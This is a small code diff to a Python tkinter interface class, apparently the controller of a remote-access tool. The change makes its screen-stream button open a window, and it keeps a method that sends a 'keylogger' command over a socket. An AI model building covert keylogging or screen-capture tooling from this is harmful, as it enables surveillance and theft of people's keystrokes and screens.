@@ -3,6 +3,8 @@ import tkinter as tk
 import ui.label as lb
 import queue
 
+import ui.ui_screenStream as sc
+
 class UI_main(tk.Tk):
     def __init__(self):
         self.ui_queue = queue.Queue()
@@ -84,7 +86,9 @@ class UI_main(tk.Tk):
 
 
     def screenStream(self):
-        self.socket_cmd("screenStream")
+        window = sc.UI_screenStream(self)
+        window.grab_set()
+        window.focus()
 
     def keylogger(self):
         self.socket_cmd("keylogger")
